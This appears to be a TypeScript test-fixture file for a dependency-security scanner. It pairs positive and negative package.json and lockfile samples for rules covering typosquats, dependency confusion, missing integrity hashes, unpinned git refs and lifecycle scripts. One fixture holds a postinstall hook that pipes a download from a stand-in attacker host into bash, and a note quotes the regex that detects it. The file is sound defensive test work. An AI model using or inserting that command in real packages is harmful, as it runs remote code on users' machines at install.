import type { RuleCase } from "./types.js";

export const cases: RuleCase[] = [
  {
    ruleId: "LOCKFILE_MISSING",
    check: "dependencies",
    positive: {
      file: "package.json",
      content: `{\n  "name": "sample-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "express": "^4.18.2"\n  }\n}\n`
    },
    negative: {
      file: "package-lock.json",
      content: `{\n  "name": "sample-app",\n  "version": "1.0.0",\n  "lockfileVersion": 3,\n  "packages": {\n    "": { "name": "sample-app", "version": "1.0.0" }\n  }\n}\n`
    },
    note: "Positive has a package.json but no lockfile of any kind, so the fg lookup for package-lock.json/pnpm-lock.yaml/yarn.lock returns empty. Negative supplies a real package-lock.json, so lockfiles.length > 0 and the LOCKFILE_MISSING branch is skipped entirely."
  },
  {
    ruleId: "PACKAGE_JSON_INVALID",
    check: "dependencies",
    positive: {
      file: "package-lock.json",
      content: `{\n  "name": "sample-app",\n  "version": "1.0.0",\n  "lockfileVersion": 3,\n  "packages": {\n    "": { "name": "sample-app", "version": "1.0.0" }\n  }\n}\n`
    },
    negative: {
      file: "package.json",
      content: `{\n  "name": "sample-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "express": "^4.18.2"\n  }\n}\n`
    },
    note: "Positive supplies only a lockfile, so package.json is genuinely absent; readFileSafe(\"package.json\") throws and the catch block pushes PACKAGE_JSON_INVALID (the finding's own title says 'missing or invalid JSON', so absence is an intended trigger, not just malformed syntax). Negative is a real, valid, non-empty package.json."
  },
  {
    ruleId: "DEPENDENCY_MALICIOUS_SCRIPT",
    check: "dependencies",
    positive: {
      file: "package-lock.json",
      content: `{\n  "name": "sample-app",\n  "lockfileVersion": 3,\n  "packages": {\n    "": { "name": "sample-app", "version": "1.0.0" },\n    "node_modules/evil-pkg": {\n      "version": "2.1.0",\n      "integrity": "sha512-abc123def456",\n      "scripts": {\n        "postinstall": "curl http://attacker.example.com/payload.sh | bash"\n      }\n    }\n  }\n}\n`
    },
    negative: {
      file: "package-lock.json",
      content: `{\n  "name": "sample-app",\n  "lockfileVersion": 3,\n  "packages": {\n    "": { "name": "sample-app", "version": "1.0.0" },\n    "node_modules/good-pkg": {\n      "version": "2.1.0",\n      "integrity": "sha512-abc123def456",\n      "scripts": {\n        "postinstall": "node scripts/postinstall.js"\n      }\n    }\n  }\n}\n`
    },
    note: "Positive's postinstall matches MALICIOUS_SCRIPT_RES's /curl\\s+[^\\s]+\\s*\\|\\s*(?:sh|bash)/ (download-and-pipe-to-shell). Negative keeps a real postinstall script (proving the rule targets the malicious pattern, not mere presence of a lifecycle script) but runs a local build file, which matches none of the five malicious regexes."
  },
  {
    ruleId: "DEP_LIFECYCLE_SCRIPTS",
    check: "dependencies",
    positive: {
      file: "package-lock.json",
      content: `{\n  "name": "sample-app",\n  "lockfileVersion": 3,\n  "packages": {\n    "": { "name": "sample-app", "version": "1.0.0" },\n    "node_modules/native-addon": {\n      "version": "1.4.2",\n      "integrity": "sha512-def456abc789",\n      "scripts": {\n        "postinstall": "node-gyp rebuild"\n      }\n    }\n  }\n}\n`
    },
    negative: {
      file: "package-lock.json",
      content: `{\n  "name": "sample-app",\n  "lockfileVersion": 3,\n  "packages": {\n    "": { "name": "sample-app", "version": "1.0.0" },\n    "node_modules/native-addon": {\n      "version": "1.4.2",\n      "integrity": "sha512-def456abc789"\n    }\n  }\n}\n`
    },
    note: "hasLifecycleScript() checks only for the presence of a scripts.postinstall/install/preinstall key, regardless of content. Positive has a (benign) postinstall key, so it fires. Negative's package entry has no scripts key at all, which is the genuinely safe state (nothing to ignore-scripts around), not just a relabeled malicious one."
  },
  {
    ruleId: "DEP_MISSING_INTEGRITY",
    check: "dependencies",
    positive: {
      file: "package-lock.json",
      content: `{\n  "name": "sample-app",\n  "lockfileVersion": 3,\n  "packages": {\n    "": { "name": "sample-app", "version": "1.0.0" },\n    "node_modules/some-lib": {\n      "version": "3.2.1"\n    }\n  }\n}\n`
    },
    negative: {
      file: "package-lock.json",
      content: `{\n  "name": "sample-app",\n  "lockfileVersion": 3,\n  "packages": {\n    "": { "name": "sample-app", "version": "1.0.0" },\n    "node_modules/some-lib": {\n      "version": "3.2.1",\n      "integrity": "sha512-9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b=="\n    }\n  }\n}\n`
    },
    note: "The check flags any packages entry with a version but no integrity field. Negative adds a real sha512 integrity hash to the same entry, which is exactly what `requiredActions` asks for (regenerate the lockfile with npm install)."
  },
  {
    ruleId: "DEPENDENCY_CONFUSION_RISK",
    check: "dependencies",
    positive: {
      file: "package.json",
      content: `{\n  "name": "sample-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "@acmecorp/internal-auth-lib": "^2.0.0"\n  }\n}\n`
    },
    negative: {
      file: "package.json",
      content: `{\n  "name": "sample-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "@types/node": "^20.11.5"\n  }\n}\n`
    },
    note: "\"@acmecorp\" is not in KNOWN_PUBLIC_SCOPES and no .npmrc registry mapping exists, so it lands in unprotectedScopes. Negative uses \"@types\", which is explicitly in KNOWN_PUBLIC_SCOPES, so the loop's `if (KNOWN_PUBLIC_SCOPES.has(scope)) continue;` skips it before the .npmrc check ever runs."
  },
  {
    ruleId: "DEP_TYPOSQUAT_EXTENDED",
    check: "dependencies",
    positive: {
      file: "package.json",
      content: `{\n  "name": "sample-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "nextjs": "^14.1.0"\n  }\n}\n`
    },
    negative: {
      file: "package.json",
      content: `{\n  "name": "sample-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "next": "^14.1.0"\n  }\n}\n`
    },
    note: "EXTENDED_TYPOSQUATS maps the key \"nextjs\" to \"next\", so the positive's dependency name matches directly. The negative uses the correctly-spelled package name \"next\", which is a value in that map, never a key, so the lookup misses."
  },
  {
    ruleId: "DEP_TYPOSQUAT",
    check: "dependencies",
    positive: {
      file: "package.json",
      content: `{\n  "name": "sample-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "lodahs": "^4.17.21"\n  }\n}\n`
    },
    negative: {
      file: "package.json",
      content: `{\n  "name": "sample-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "lodash": "^4.17.21"\n  }\n}\n`
    },
    note: "KNOWN_TYPOSQUATS has \"lodahs\" mapped to \"lodash\". Negative uses the correctly spelled \"lodash\", which does not appear as a key in KNOWN_TYPOSQUATS."
  },
  {
    ruleId: "DEP_SUSPICIOUS_VERSION",
    check: "dependencies",
    positive: {
      file: "package.json",
      content: `{\n  "name": "sample-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "acme-x": "999.0.0"\n  }\n}\n`
    },
    negative: {
      file: "package.json",
      content: `{\n  "name": "sample-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "acme-x": "^2.4.1"\n  }\n}\n`
    },
    note: "SUSPICIOUS_VERSION_RE (/^\\^?999\\.|^0\\.0\\.[01]$/) matches \"999.0.0\", and the dep name \"acme-x\" (6 chars) is under the 8-char length gate. Negative keeps the identical short name but uses an ordinary semver range, so the version regex itself is what's being tested rather than the name-length condition."
  },
  {
    ruleId: "SUPPLY_CHAIN_SCORECARD_PARTIAL",
    check: "dependencies",
    positive: {
      file: "package.json",
      content: `{\n  "name": "sample-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "dep01": "^1.0.0", "dep02": "^1.0.0", "dep03": "^1.0.0", "dep04": "^1.0.0", "dep05": "^1.0.0",\n    "dep06": "^1.0.0", "dep07": "^1.0.0", "dep08": "^1.0.0", "dep09": "^1.0.0", "dep10": "^1.0.0",\n    "dep11": "^1.0.0", "dep12": "^1.0.0", "dep13": "^1.0.0", "dep14": "^1.0.0", "dep15": "^1.0.0"\n  },\n  "devDependencies": {\n    "devdep01": "^1.0.0", "devdep02": "^1.0.0", "devdep03": "^1.0.0", "devdep04": "^1.0.0",\n    "devdep05": "^1.0.0", "devdep06": "^1.0.0", "devdep07": "^1.0.0"\n  }\n}\n`
    },
    negative: {
      file: "package.json",
      content: `{\n  "name": "sample-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "dep01": "^1.0.0", "dep02": "^1.0.0", "dep03": "^1.0.0", "dep04": "^1.0.0", "dep05": "^1.0.0"\n  }\n}\n`
    },
    note: "totalAllDeps (prod + dev) is 22 in the positive, exceeding the 20-dep cap, so SUPPLY_CHAIN_SCORECARD_PARTIAL fires regardless of any network scorecard lookup. Negative has 5 total deps, under the cap, so the `if (totalAllDeps > 20)` branch is never entered."
  },
  {
    ruleId: "DEP_IGNORE_SCRIPTS_MISSING",
    check: "dependencies",
    positive: {
      file: "package-lock.json",
      content: `{\n  "name": "sample-app",\n  "lockfileVersion": 3,\n  "packages": {\n    "": { "name": "sample-app", "version": "1.0.0" },\n    "node_modules/node-gyp-build": {\n      "version": "4.8.1",\n      "resolved": "https://registry.npmjs.org/node-gyp-build/-/node-gyp-build-4.8.1.tgz",\n      "integrity": "sha512-abc123==",\n      "scripts": { "install": "node-gyp-build" }\n    }\n  }\n}\n`
    },
    negative: {
      file: "package-lock.json",
      content: `{\n  "name": "sample-app",\n  "lockfileVersion": 3,\n  "packages": {\n    "": { "name": "sample-app", "version": "1.0.0" },\n    "node_modules/lodash": {\n      "version": "4.17.21",\n      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",\n      "integrity": "sha512-abc123=="\n    }\n  }\n}\n`
    },
    note: "checkIgnoreScripts() is only invoked when scanLockfilePackages() finds at least one package with a postinstall/install/preinstall script (scriptPkgs.length > 0), and it always reads .npmrc unconditionally from the workspace root — so with the RuleCase harness's one-file-per-case constraint, an .npmrc-only sample can never reach it (no lockfile means checkTransitiveDependencies returns before ever calling checkIgnoreScripts). Positive's lockfile entry has an `install` script, which makes scriptPkgs non-empty; since this isolated case workspace has no .npmrc, readFileSafe(\".npmrc\") throws, npmrcContent stays empty, and the ignore-scripts=true regex can't match, so the finding fires. Negative's lockfile has zero scripted dependencies, so scriptPkgs.length === 0 and checkIgnoreScripts() is never called at all — the real suppression path this single-file harness can exercise, as opposed to the (untestable here) '.npmrc already sets ignore-scripts=true' path."
  },
  {
    ruleId: "DEP_MAINTAINER_RISK",
    check: "dependencies",
    positive: {
      file: "package.json",
      content: `{\n  "name": "sample-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "event-stream": "^3.3.6"\n  }\n}\n`
    },
    negative: {
      file: "package.json",
      content: `{\n  "name": "sample-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "through2": "^4.0.2"\n  }\n}\n`
    },
    note: "\"event-stream\" is a literal entry in KNOWN_INCIDENT_PACKAGES (the 2018 flatmap-stream backdoor). Negative uses \"through2\", an actively-maintained transform-stream library that fills the same role without appearing in that set — a genuine alternative, not a renamed vulnerable package."
  },
  {
    ruleId: "DEP_GIT_PROTOCOL_UNPINNED",
    check: "dependencies",
    positive: {
      file: "package.json",
      content: `{\n  "name": "sample-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "internal-lib": "git+https://github.com/acmecorp/internal-lib.git#main"\n  }\n}\n`
    },
    negative: {
      file: "package.json",
      content: `{\n  "name": "sample-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "internal-lib": "git+https://github.com/acmecorp/internal-lib.git#a1b2c3d4e5f60718293a4b5c6d7e8f90123456ab"\n  }\n}\n`
    },
    note: "The spec matches gitRe (git+https://) and its ref \"#main\" is a mutable branch name that matches neither the 40-hex-char shaPinRe nor semverPinRe. Negative pins to a 40-character hex commit SHA, satisfying shaPinRe and excluding it from the unpinned-hits filter."
  },
  {
    ruleId: "DEP_LOCAL_PATH_OVERRIDE",
    check: "dependencies",
    positive: {
      file: "package.json",
      content: `{\n  "name": "sample-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "shared-utils": "file:../shared-utils"\n  }\n}\n`
    },
    negative: {
      file: "package.json",
      content: `{\n  "name": "sample-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "shared-utils": "^2.3.0"\n  }\n}\n`
    },
    note: "\"file:../shared-utils\" matches localRe (/^(?:link:|file:|portal:)/i). Negative depends on a normal registry-published semver range instead of a local path, so localRe never matches."
  }
];
